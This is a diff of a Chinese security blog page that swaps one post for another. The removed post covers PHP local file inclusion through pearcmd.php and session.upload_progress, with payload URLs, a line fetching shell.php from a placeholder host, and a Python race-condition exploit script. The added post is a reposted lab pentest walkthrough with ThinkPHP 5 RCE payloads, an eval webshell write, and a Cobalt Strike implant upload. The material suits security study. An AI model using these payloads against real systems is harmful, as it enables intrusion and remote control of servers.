@@ -20,22 +20,30 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
-  <meta name="description" content="# 前言 学习一下思路，详细的解析当然看p神，还有一些其他的文件包含技巧 Docker PHP裸文件本地包含综述 利用&#x2F;include.php?+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;&lt;?&#x3D;phpinfo()">
+  <meta name="description" content="前言转载于 内网渗透初探(二)|内网渗透全过程重新学习-先知社区 环境介绍专门做了个拓扑图，首先外网打点，然后内网穿透，进域内，攻击域主机2、域主机1，通过pth、ptt的方式拿下域控。 三、外网打点1、打开站点，为thinkphp默认页，版本为tp52、尝试几个EXP后，成功执行命令 http:&#x2F;&#x2F;192.168.31.32&#x2F;public&#x2F;index.ph">
 <meta property="og:type" content="article">
-<meta property="og:title" content="LFI pearcmd.php与session_upload_progress">
-<meta property="og:url" content="http://example.com/2021/11/21/LFI%20--%20pearcmd.php%20%E4%B8%8E%20session_upload_progress/index.html">
+<meta property="og:title" content="Y0ng的博客">
+<meta property="og:url" content="http://example.com/2022/03/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%9D%E6%8E%A2(%E4%BA%8C)/index.html">
 <meta property="og:site_name" content="Y0ng的博客">
-<meta property="og:description" content="# 前言 学习一下思路，详细的解析当然看p神，还有一些其他的文件包含技巧 Docker PHP裸文件本地包含综述 利用&#x2F;include.php?+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;&lt;?&#x3D;phpinfo()">
+<meta property="og:description" content="前言转载于 内网渗透初探(二)|内网渗透全过程重新学习-先知社区 环境介绍专门做了个拓扑图，首先外网打点，然后内网穿透，进域内，攻击域主机2、域主机1，通过pth、ptt的方式拿下域控。 三、外网打点1、打开站点，为thinkphp默认页，版本为tp52、尝试几个EXP后，成功执行命令 http:&#x2F;&#x2F;192.168.31.32&#x2F;public&#x2F;index.ph">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2592a6f21363465ca0bf72f2b65c5526.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/1cd1aad16ae44e0c82176793ff5e71af.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="article:published_time" content="2021-11-21T14:11:39.318Z">
-<meta property="article:modified_time" content="2022-01-22T19:11:25.251Z">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/1377ctf/20211124135739-6e94c174-4ceb-1.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/1377ctf/20211124135756-78ac7b48-4ceb-1.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/1377ctf/20211124135810-8116045c-4ceb-1.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/1377ctf/20211124135827-8af1284e-4ceb-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20211124135843-94b429e4-4ceb-1.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/1377ctf/20211124135902-9fe74062-4ceb-1.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/1377ctf/20211124135921-aaecbe1a-4ceb-1.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/1377ctf/20211124140157-084cae26-4cec-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20211124135956-c0315cae-4ceb-1.png">
+<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/1377ctf/20211124135939-b5e1be42-4ceb-1.png">
+<meta property="article:published_time" content="2022-03-14T12:58:58.034Z">
+<meta property="article:modified_time" content="2022-03-14T03:32:15.384Z">
 <meta property="article:author" content="Y0ng">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/2592a6f21363465ca0bf72f2b65c5526.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta name="twitter:image" content="https://gitee.com/yongsheng220/image/raw/master/1377ctf/20211124135739-6e94c174-4ceb-1.png">
 
-<link rel="canonical" href="http://example.com/2021/11/21/LFI%20--%20pearcmd.php%20%E4%B8%8E%20session_upload_progress/">
+<link rel="canonical" href="http://example.com/2022/03/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%9D%E6%8E%A2(%E4%BA%8C)/">
 
 
 <script id="page-configurations">
@@ -48,7 +56,7 @@
   };
 </script>
 
-  <title>LFI pearcmd.php与session_upload_progress | Y0ng的博客</title>
+  <title> | Y0ng的博客</title>
   
 
 
@@ -201,7 +209,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/21/LFI%20--%20pearcmd.php%20%E4%B8%8E%20session_upload_progress/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%9D%E6%8E%A2(%E4%BA%8C)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/cys.jpg">
@@ -214,7 +222,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          LFI pearcmd.php与session_upload_progress
+          
         </h1>
 
         <div class="post-meta">
@@ -223,24 +231,9 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2021-11-21 22:11:39" itemprop="dateCreated datePublished" datetime="2021-11-21T22:11:39+08:00">2021-11-21</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-01-23 03:11:25" itemprop="dateModified" datetime="2022-01-23T03:11:25+08:00">2022-01-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" itemprop="url" rel="index"><span itemprop="name">文件包含</span></a>
-                </span>
+              <time title="创建时间：2022-03-14 20:58:58 / 修改时间：11:32:15" itemprop="dateCreated datePublished" datetime="2022-03-14T20:58:58+08:00">2022-03-14</time>
             </span>
 
           
@@ -261,25 +254,22 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>﻿# 前言</p>
-<p>学习一下思路，详细的解析当然看p神，还有一些其他的文件包含技巧</p>
-<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#">Docker PHP裸文件本地包含综述</a></p>
-<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;include.php?+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;&lt;?&#x3D;phpinfo()?&gt;+&#x2F;tmp&#x2F;hello.php</span><br></pre></td></tr></table></figure>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>转载于 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10543">内网渗透初探(二)|内网渗透全过程重新学习-先知社区</a></p>
+<h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><p>专门做了个拓扑图，首先外网打点，然后内网穿透，进域内，攻击域主机2、域主机1，通过pth、ptt的方式拿下域控。<br><img src="https://gitee.com/yongsheng220/image/raw/master/1377ctf/20211124135739-6e94c174-4ceb-1.png" alt="img"></p>
+<h2 id="三、外网打点"><a href="#三、外网打点" class="headerlink" title="三、外网打点"></a>三、外网打点</h2><p>1、打开站点，为thinkphp默认页，版本为tp5<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211124135756-78ac7b48-4ceb-1.png"><img src="https://gitee.com/yongsheng220/image/raw/master/1377ctf/20211124135756-78ac7b48-4ceb-1.png" alt="img"></a><br>2、尝试几个EXP后，成功执行命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.31.32&#x2F;public&#x2F;index.php?s&#x3D;captcha</span><br><span class="line"></span><br><span class="line">[post]</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;call_user_func&amp;server[]&#x3D;phpinfo&amp;get[]&#x3D;phpinfo</span><br></pre></td></tr></table></figure>
 
-<a id="more"></a>
+<p>[<img src="https://gitee.com/yongsheng220/image/raw/master/1377ctf/20211124135810-8116045c-4ceb-1.png" alt="img"><br>3、简单判断系统为Windows</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.31.32&#x2F;public&#x2F;index.php?s&#x3D;captcha</span><br><span class="line"></span><br><span class="line">[post]</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ipconfig</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/2592a6f21363465ca0bf72f2b65c5526.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
-<p>包含一下<code>/tmp/hello.php</code>就ok了<br><img src="https://img-blog.csdnimg.cn/1cd1aad16ae44e0c82176793ff5e71af.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
-<p>其他利用方法：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;+-c+&#x2F;tmp&#x2F;.feng.php+-d+man_dir&#x3D;&lt;?eval($_POST[0]);?&gt;+-s+</span><br><span class="line"></span><br><span class="line">&#x2F;?file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;+install+-R+&#x2F;tmp+http:&#x2F;&#x2F;xxx&#x2F;shell.php</span><br><span class="line"></span><br><span class="line">?file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php &amp;+download+http:&#x2F;&#x2F;xxx:81&#x2F;shell.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/yongsheng220/image/raw/master/1377ctf/20211124135827-8af1284e-4ceb-1.png" alt="img"></p>
+<p>4、获取当前目录路径</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.31.32&#x2F;public&#x2F;index.php?s&#x3D;captcha</span><br><span class="line"></span><br><span class="line">[post]</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;chdir</span><br></pre></td></tr></table></figure>
 
-<h1 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a>session.upload_progress</h1><blockquote>
-<p>session.upload_progress=On</p>
-</blockquote>
-<p>其中最重要的几个设置如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">session.upload_progress.enabled &#x3D; on</span><br><span class="line">session.upload_progress.cleanup &#x3D; on</span><br><span class="line">session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;</span><br><span class="line">session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">session.upload_progress.enabled可以控制是否开启session.upload_progress功能</span><br><span class="line"></span><br><span class="line">session.upload_progress.cleanup可以控制是否在上传之后删除文件内容</span><br><span class="line"></span><br><span class="line">session.upload_progress.prefix可以设置上传文件内容的前缀</span><br><span class="line"></span><br><span class="line">session.upload_progress.name的值即为session中的键值</span><br></pre></td></tr></table></figure>
-<p>脚本：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line">import requests</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor, wait</span><br><span class="line"></span><br><span class="line">target &#x3D; &#39;http:&#x2F;&#x2F;192.168.1.162:8080&#x2F;index.php&#39;</span><br><span class="line">session &#x3D; requests.session()</span><br><span class="line">flag &#x3D; &#39;helloworld&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def upload(e: threading.Event):</span><br><span class="line">    files &#x3D; [</span><br><span class="line">        (&#39;file&#39;, (&#39;load.png&#39;, b&#39;a&#39; * 40960, &#39;image&#x2F;png&#39;)),</span><br><span class="line">    ]</span><br><span class="line">    data &#x3D; &#123;&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: rf&#39;&#39;&#39;&lt;?php file_put_contents(&#39;&#x2F;tmp&#x2F;success&#39;, &#39;&lt;?&#x3D;phpinfo()?&gt;&#39;); echo(&#39;&#123;flag&#125;&#39;); ?&gt;&#39;&#39;&#39;&#125;</span><br><span class="line"></span><br><span class="line">    while not e.is_set():</span><br><span class="line">        requests.post(</span><br><span class="line">            target,</span><br><span class="line">            data&#x3D;data,</span><br><span class="line">            files&#x3D;files,</span><br><span class="line">            cookies&#x3D;&#123;&#39;PHPSESSID&#39;: flag&#125;,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write(e: threading.Event):</span><br><span class="line">    while not e.is_set():</span><br><span class="line">        response &#x3D; requests.get(</span><br><span class="line">            f&#39;&#123;target&#125;?file&#x3D;&#x2F;tmp&#x2F;sess_&#123;flag&#125;&#39;,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        if flag.encode() in response.content:</span><br><span class="line">            e.set()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    futures &#x3D; []</span><br><span class="line">    event &#x3D; threading.Event()</span><br><span class="line">    pool &#x3D; ThreadPoolExecutor(15)</span><br><span class="line">    for i in range(10):</span><br><span class="line">        futures.append(pool.submit(upload, event))</span><br><span class="line"></span><br><span class="line">    for i in range(5):</span><br><span class="line">        futures.append(pool.submit(write, event))</span><br><span class="line"></span><br><span class="line">    wait(futures)</span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124135843-94b429e4-4ceb-1.png" alt="img"><br>5、在当前目录写入一句话木马123.php</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.31.32&#x2F;public&#x2F;index.php?s&#x3D;captcha</span><br><span class="line"></span><br><span class="line">[post]</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;echo &quot;&lt;?php eval($_REQUEST[1])?&gt;&quot; &gt;123.php</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211124135902-9fe74062-4ceb-1.png"><img src="https://gitee.com/yongsheng220/image/raw/master/1377ctf/20211124135902-9fe74062-4ceb-1.png" alt="img"></a><br>6、测试代码执行<br><a target="_blank" rel="noopener" href="http://192.168.31.32/public/123.php?1=phpinfo();">http://192.168.31.32/public/123.php?1=phpinfo();</a><br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211124135921-aaecbe1a-4ceb-1.png"><img src="https://gitee.com/yongsheng220/image/raw/master/1377ctf/20211124135921-aaecbe1a-4ceb-1.png" alt="img"></a><br>7、蚁剑连接<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211124140157-084cae26-4cec-1.png"><img src="https://gitee.com/yongsheng220/image/raw/master/1377ctf/20211124140157-084cae26-4cec-1.png" alt="img"></a><br>8、上传CS马123.exe<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211124135956-c0315cae-4ceb-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124135956-c0315cae-4ceb-1.png" alt="img"></a><br>9、执行并上线<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211124135939-b5e1be42-4ceb-1.png"><img src="https://gitee.com/yongsheng220/image/raw/master/1377ctf/20211124135939-b5e1be42-4ceb-1.png" alt="img"></a></p>
 
     </div>
 
@@ -295,13 +285,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/11/16/ctfshow%20nodejs/" rel="prev" title="ctfshow nodejs">
-      <i class="fa fa-chevron-left"></i> ctfshow nodejs
+    <a href="/2022/03/13/1337/" rel="prev" title="1337UP-Live CTF">
+      <i class="fa fa-chevron-left"></i> 1337UP-Live CTF
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2021/11/24/ThinkPHP%20v6.0.9%20eval%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/" rel="next" title="ThinkPHP v6.0.9 eval反序列化代码执行 分析">
-      ThinkPHP v6.0.9 eval反序列化代码执行 分析 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -360,7 +347,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#session-upload-progress"><span class="nav-number">2.</span> <span class="nav-text">session.upload_progress</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E4%BB%8B%E7%BB%8D"><span class="nav-number">2.</span> <span class="nav-text">环境介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="nav-number">2.1.</span> <span class="nav-text">三、外网打点</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
